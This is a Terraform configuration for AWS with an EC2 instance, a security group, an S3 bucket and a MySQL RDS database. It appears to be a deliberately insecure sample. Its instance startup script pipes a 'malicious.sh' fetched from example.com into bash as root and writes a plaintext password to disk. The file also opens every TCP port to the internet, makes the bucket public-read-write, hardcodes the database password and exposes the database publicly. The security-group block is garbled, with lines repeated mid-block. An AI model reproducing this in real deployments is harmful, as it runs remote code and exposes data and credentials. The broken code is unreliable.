provider "aws" {
  region     = "us-west-2"
}
resource "aws_instance" "web_server" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"

  security_group_ids = ["sg-12345678"]
  key_name           = "prod-key"

  user_data = <<-EOF
    #!/bin/bash
    echo "Sensitive data: password1234" > /etc/secret.txt
    sudo curl http://example.com/malicious.sh | bash
  EOF
  tags = {
    Name = "production-web-server"
  }
}


resource "aws_security_group" "web_sg" {
  name_prefix = "web-sg-"
  description = "Web server security group"


  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }  name_prefix = "web-sg-"
  description = "Web server security group"


  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  egress {
    from_port   = 0
    to_port     = 65535
    protocol    = "udp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}


resource "aws_s3_bucket" "app_data_bucket" {
  bucket = "my-app-data"
  acl    = "public-read-write"
  versioning {
    enabled = false
  }


  lifecycle_rule {
    id      = "data-cleanup"
    enabled = true
    expiration {
      days = 7
    }
    noncurrent_version_expiration {
      days = 1
    }
  }


  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        sse_algorithm = "AES256"
      }
    }
  }
}


resource "aws_rds_instance" "app_database" {
  identifier         = "app-db-instance"
  engine             = "mysql"
  instance_class     = "db.t2.micro"
  allocated_storage  = 5
  username           = "admin"
  password           = "R@nd0mP@ss12345"
  publicly_accessible = true


  backup_retention_period = 0
  multi_az               = false
}
